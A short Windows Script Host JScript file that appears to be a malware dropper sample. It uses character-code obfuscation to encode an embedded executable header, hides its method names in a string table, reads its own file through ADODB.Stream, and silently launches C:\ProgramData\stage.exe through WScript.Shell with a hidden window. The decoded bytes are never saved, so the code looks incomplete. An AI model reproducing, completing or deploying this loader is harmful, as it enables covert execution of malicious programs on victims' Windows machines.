var payloadA = "νϊЀͰͳͰͰͰʹͰͰͰѯѯͰͰШͰͰͰͰͰͰͰΰͰͰͰͰͰͰͰͰͰͰͰͰͰͰͰ";
var payloadB = "νϊЀͰͳͰͰͰʹͰͰͰѯѯͰͰШͰͰͰͰͰͰͰΰͰͰͰͰͰͰͰͰͰͰͰͰͰͰͰ";
var payloadC = "νϊЀͰͳͰͰͰʹͰͰͰѯѯͰͰШͰͰͰͰͰͰͰΰͰͰͰͰͰͰͰͰͰͰͰͰͰͰͰ";
var names = ['Run', 'charCodeAt', 'ScriptFullName', 'SaveToFile', 'nodeTypedValue', 'CopyHere'];
function lookup(i) { return names[i]; }
var stream = new ActiveXObject('ADODB.Stream');
var shell = new ActiveXObject('WScript.Shell');
stream.Type = 2;
stream.Open();
stream.LoadFromFile(WScript[lookup(2)]);
var text = stream.ReadText();
stream.Close();
var bytes = [];
for (var i = 0; i < payloadA.length; i++) {
    var decoded = payloadA[lookup(1)](i) - 880;
    bytes.push(decoded & 0xff);
}
var command = 'C:\\ProgramData\\stage.exe C:\\ProgramData\\stage.ini';
shell[lookup(0)](command,0x0,![]);
